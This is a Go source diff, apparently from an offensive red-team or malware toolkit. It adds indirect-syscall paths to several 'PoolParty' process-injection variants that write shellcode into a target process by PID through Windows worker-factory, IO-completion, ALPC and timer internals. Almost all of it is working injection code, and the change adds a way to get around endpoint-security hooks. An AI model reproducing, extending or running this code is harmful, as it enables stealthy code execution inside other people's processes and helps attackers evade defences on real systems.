@@ -140,13 +140,25 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 
 	// Step 3: Query worker factory information
 	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
-	status, _, _ := procNtQueryInformationWorkerFactory.Call(
-		uintptr(hWorkerFactory),
-		uintptr(WorkerFactoryBasicInformation),
-		uintptr(unsafe.Pointer(&workerFactoryInfo)),
-		uintptr(unsafe.Sizeof(workerFactoryInfo)),
-		0,
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtQueryInformationWorkerFactory(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryBasicInformation),
+			uintptr(unsafe.Pointer(&workerFactoryInfo)),
+			uintptr(unsafe.Sizeof(workerFactoryInfo)),
+			0,
+		)
+	} else {
+		statusPtr, _, _ := procNtQueryInformationWorkerFactory.Call(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryBasicInformation),
+			uintptr(unsafe.Pointer(&workerFactoryInfo)),
+			uintptr(unsafe.Sizeof(workerFactoryInfo)),
+			0,
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
 	}
@@ -162,12 +174,22 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 
 	// Step 5: Increase thread minimum to trigger new worker thread creation
 	newMinimum := workerFactoryInfo.TotalWorkerCount + 1
-	status, _, _ = procNtSetInformationWorkerFactory.Call(
-		uintptr(hWorkerFactory),
-		uintptr(WorkerFactoryThreadMinimum),
-		uintptr(unsafe.Pointer(&newMinimum)),
-		uintptr(unsafe.Sizeof(newMinimum)),
-	)
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtSetInformationWorkerFactory(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryThreadMinimum),
+			uintptr(unsafe.Pointer(&newMinimum)),
+			uintptr(unsafe.Sizeof(newMinimum)),
+		)
+	} else {
+		statusPtr, _, _ := procNtSetInformationWorkerFactory.Call(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryThreadMinimum),
+			uintptr(unsafe.Pointer(&newMinimum)),
+			uintptr(unsafe.Sizeof(newMinimum)),
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtSetInformationWorkerFactory failed: 0x%X", status)
 	}
@@ -209,13 +231,25 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 
 	// Step 3: Query worker factory information
 	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
-	status, _, _ := procNtQueryInformationWorkerFactory.Call(
-		uintptr(hWorkerFactory),
-		uintptr(WorkerFactoryBasicInformation),
-		uintptr(unsafe.Pointer(&workerFactoryInfo)),
-		uintptr(unsafe.Sizeof(workerFactoryInfo)),
-		0,
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtQueryInformationWorkerFactory(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryBasicInformation),
+			uintptr(unsafe.Pointer(&workerFactoryInfo)),
+			uintptr(unsafe.Sizeof(workerFactoryInfo)),
+			0,
+		)
+	} else {
+		statusPtr, _, _ := procNtQueryInformationWorkerFactory.Call(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryBasicInformation),
+			uintptr(unsafe.Pointer(&workerFactoryInfo)),
+			uintptr(unsafe.Sizeof(workerFactoryInfo)),
+			0,
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
 	}
@@ -476,16 +510,31 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	output += "[+] Created event 'PoolPartyEvent'\n"
 
 	// Step 10: Associate event with IO completion port via ZwAssociateWaitCompletionPacket
-	status, _, _ := procZwAssociateWaitCompletionPacket.Call(
-		pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
-		uintptr(hIoCompletion), // IoCompletionHandle
-		hEvent,                 // TargetObjectHandle (event)
-		tpDirectAddr,           // KeyContext (remote TP_DIRECT)
-		tpWaitAddr,             // ApcContext (remote TP_WAIT)
-		0,                      // IoStatus
-		0,                      // IoStatusInformation
-		0,                      // AlreadySignaled (NULL)
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectZwAssociateWaitCompletionPacket(
+			pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
+			uintptr(hIoCompletion), // IoCompletionHandle
+			hEvent,                 // TargetObjectHandle (event)
+			tpDirectAddr,           // KeyContext (remote TP_DIRECT)
+			tpWaitAddr,             // ApcContext (remote TP_WAIT)
+			0,                      // IoStatus
+			0,                      // IoStatusInformation
+			0,                      // AlreadySignaled (NULL)
+		)
+	} else {
+		statusPtr, _, _ := procZwAssociateWaitCompletionPacket.Call(
+			pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
+			uintptr(hIoCompletion), // IoCompletionHandle
+			hEvent,                 // TargetObjectHandle (event)
+			tpDirectAddr,           // KeyContext (remote TP_DIRECT)
+			tpWaitAddr,             // ApcContext (remote TP_WAIT)
+			0,                      // IoStatus
+			0,                      // IoStatusInformation
+			0,                      // AlreadySignaled (NULL)
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("ZwAssociateWaitCompletionPacket failed: 0x%X", status)
 	}
@@ -603,13 +652,25 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 		Port: uintptr(hIoCompletion),
 		Key:  remoteTpDirectAddr,
 	}
-	status, _, _ := procZwSetInformationFile.Call(
-		hFile,
-		uintptr(unsafe.Pointer(&ioStatusBlock)),
-		uintptr(unsafe.Pointer(&fileCompletionInfo)),
-		uintptr(unsafe.Sizeof(fileCompletionInfo)),
-		uintptr(FileReplaceCompletionInformation),
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectZwSetInformationFile(
+			hFile,
+			uintptr(unsafe.Pointer(&ioStatusBlock)),
+			uintptr(unsafe.Pointer(&fileCompletionInfo)),
+			uintptr(unsafe.Sizeof(fileCompletionInfo)),
+			uintptr(FileReplaceCompletionInformation),
+		)
+	} else {
+		statusPtr, _, _ := procZwSetInformationFile.Call(
+			hFile,
+			uintptr(unsafe.Pointer(&ioStatusBlock)),
+			uintptr(unsafe.Pointer(&fileCompletionInfo)),
+			uintptr(unsafe.Sizeof(fileCompletionInfo)),
+			uintptr(FileReplaceCompletionInformation),
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("ZwSetInformationFile failed: 0x%X", status)
 	}
@@ -675,11 +736,21 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 
 	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
 	var hTempAlpc uintptr
-	status, _, _ := procNtAlpcCreatePort.Call(
-		uintptr(unsafe.Pointer(&hTempAlpc)),
-		0, // ObjectAttributes
-		0, // PortAttributes
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtAlpcCreatePort(
+			uintptr(unsafe.Pointer(&hTempAlpc)),
+			0, // ObjectAttributes
+			0, // PortAttributes
+		)
+	} else {
+		statusPtr, _, _ := procNtAlpcCreatePort.Call(
+			uintptr(unsafe.Pointer(&hTempAlpc)),
+			0, // ObjectAttributes
+			0, // PortAttributes
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtAlpcCreatePort (temp) failed: 0x%X", status)
 	}
@@ -726,11 +797,20 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	portAttr.MaxMessageLength = 328
 
 	var hAlpc uintptr
-	status, _, _ = procNtAlpcCreatePort.Call(
-		uintptr(unsafe.Pointer(&hAlpc)),
-		uintptr(unsafe.Pointer(&objAttr)),
-		uintptr(unsafe.Pointer(&portAttr)),
-	)
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtAlpcCreatePort(
+			uintptr(unsafe.Pointer(&hAlpc)),
+			uintptr(unsafe.Pointer(&objAttr)),
+			uintptr(unsafe.Pointer(&portAttr)),
+		)
+	} else {
+		statusPtr, _, _ := procNtAlpcCreatePort.Call(
+			uintptr(unsafe.Pointer(&hAlpc)),
+			uintptr(unsafe.Pointer(&objAttr)),
+			uintptr(unsafe.Pointer(&portAttr)),
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtAlpcCreatePort failed: 0x%X", status)
 	}
@@ -758,12 +838,22 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 		CompletionKey:  tpAlpcAddr,
 		CompletionPort: uintptr(hIoCompletion),
 	}
-	status, _, _ = procNtAlpcSetInformation.Call(
-		hAlpc,
-		uintptr(AlpcAssociateCompletionPortInformation),
-		uintptr(unsafe.Pointer(&alpcAssoc)),
-		uintptr(unsafe.Sizeof(alpcAssoc)),
-	)
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtAlpcSetInformation(
+			hAlpc,
+			uintptr(AlpcAssociateCompletionPortInformation),
+			uintptr(unsafe.Pointer(&alpcAssoc)),
+			uintptr(unsafe.Sizeof(alpcAssoc)),
+		)
+	} else {
+		statusPtr, _, _ := procNtAlpcSetInformation.Call(
+			hAlpc,
+			uintptr(AlpcAssociateCompletionPortInformation),
+			uintptr(unsafe.Pointer(&alpcAssoc)),
+			uintptr(unsafe.Sizeof(alpcAssoc)),
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtAlpcSetInformation failed: 0x%X", status)
 	}
@@ -785,19 +875,36 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	// Set timeout to 1 second to prevent blocking
 	var timeout int64 = -10000000 // 1 second in 100-nanosecond intervals
 
-	status, _, _ = procNtAlpcConnectPort.Call(
-		uintptr(unsafe.Pointer(&hClientPort)),
-		uintptr(unsafe.Pointer(&usPortName)),
-		uintptr(unsafe.Pointer(&clientObjAttr)),
-		uintptr(unsafe.Pointer(&portAttr)),
-		0x20000, // Connection flags
-		0,       // RequiredServerSid
-		uintptr(unsafe.Pointer(&alpcMessage)),
-		uintptr(unsafe.Pointer(&messageSize)),
-		0, // OutMessageAttributes
-		0, // InMessageAttributes
-		uintptr(unsafe.Pointer(&timeout)),
-	)
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtAlpcConnectPort(
+			uintptr(unsafe.Pointer(&hClientPort)),
+			uintptr(unsafe.Pointer(&usPortName)),
+			uintptr(unsafe.Pointer(&clientObjAttr)),
+			uintptr(unsafe.Pointer(&portAttr)),
+			0x20000, // Connection flags
+			0,       // RequiredServerSid
+			uintptr(unsafe.Pointer(&alpcMessage)),
+			uintptr(unsafe.Pointer(&messageSize)),
+			0, // OutMessageAttributes
+			0, // InMessageAttributes
+			uintptr(unsafe.Pointer(&timeout)),
+		)
+	} else {
+		statusPtr, _, _ := procNtAlpcConnectPort.Call(
+			uintptr(unsafe.Pointer(&hClientPort)),
+			uintptr(unsafe.Pointer(&usPortName)),
+			uintptr(unsafe.Pointer(&clientObjAttr)),
+			uintptr(unsafe.Pointer(&portAttr)),
+			0x20000, // Connection flags
+			0,       // RequiredServerSid
+			uintptr(unsafe.Pointer(&alpcMessage)),
+			uintptr(unsafe.Pointer(&messageSize)),
+			0, // OutMessageAttributes
+			0, // InMessageAttributes
+			uintptr(unsafe.Pointer(&timeout)),
+		)
+		status = uint32(statusPtr)
+	}
 	// NtAlpcConnectPort may return timeout status, which is expected
 	output += "[+] Connected to ALPC port to trigger completion\n"
 	output += "[+] PoolParty Variant 5 injection completed successfully\n"
@@ -982,13 +1089,25 @@ func executeVariant7(shellcode []byte, pid uint32) (string, error) {
 	output += fmt.Sprintf("[+] TP_DIRECT at: 0x%X\n", tpDirectAddr)
 
 	// Step 8: Queue completion packet via ZwSetIoCompletion
-	status, _, _ := procZwSetIoCompletion.Call(
-		uintptr(hIoCompletion),
-		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
-		0,            // ApcContext
-		0,            // IoStatus
-		0,            // IoStatusInformation
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectZwSetIoCompletion(
+			uintptr(hIoCompletion),
+			tpDirectAddr, // KeyContext - pointer to TP_DIRECT
+			0,            // ApcContext
+			0,            // IoStatus
+			0,            // IoStatusInformation
+		)
+	} else {
+		statusPtr, _, _ := procZwSetIoCompletion.Call(
+			uintptr(hIoCompletion),
+			tpDirectAddr, // KeyContext - pointer to TP_DIRECT
+			0,            // ApcContext
+			0,            // IoStatus
+			0,            // IoStatusInformation
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
 	}
@@ -1038,13 +1157,25 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	// Step 4: Query worker factory to get TP_POOL address
 	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
 	var returnLength uint32
-	status, _, _ := procNtQueryInformationWorkerFactory.Call(
-		uintptr(hWorkerFactory),
-		uintptr(WorkerFactoryBasicInformation),
-		uintptr(unsafe.Pointer(&workerFactoryInfo)),
-		uintptr(unsafe.Sizeof(workerFactoryInfo)),
-		uintptr(unsafe.Pointer(&returnLength)),
-	)
+	var status uint32
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtQueryInformationWorkerFactory(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryBasicInformation),
+			uintptr(unsafe.Pointer(&workerFactoryInfo)),
+			uintptr(unsafe.Sizeof(workerFactoryInfo)),
+			uintptr(unsafe.Pointer(&returnLength)),
+		)
+	} else {
+		statusPtr, _, _ := procNtQueryInformationWorkerFactory.Call(
+			uintptr(hWorkerFactory),
+			uintptr(WorkerFactoryBasicInformation),
+			uintptr(unsafe.Pointer(&workerFactoryInfo)),
+			uintptr(unsafe.Sizeof(workerFactoryInfo)),
+			uintptr(unsafe.Pointer(&returnLength)),
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
 	}
@@ -1167,12 +1298,22 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	dueTime = timeout
 
 	var params T2_SET_PARAMETERS
-	status, _, _ = procNtSetTimer2.Call(
-		uintptr(hTimer),
-		uintptr(unsafe.Pointer(&dueTime)),
-		0, // Period
-		uintptr(unsafe.Pointer(&params)),
-	)
+	if IndirectSyscallsAvailable() {
+		status = IndirectNtSetTimer2(
+			uintptr(hTimer),
+			uintptr(unsafe.Pointer(&dueTime)),
+			0, // Period
+			uintptr(unsafe.Pointer(&params)),
+		)
+	} else {
+		statusPtr, _, _ := procNtSetTimer2.Call(
+			uintptr(hTimer),
+			uintptr(unsafe.Pointer(&dueTime)),
+			0, // Period
+			uintptr(unsafe.Pointer(&params)),
+		)
+		status = uint32(statusPtr)
+	}
 	if status != 0 {
 		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
 	}
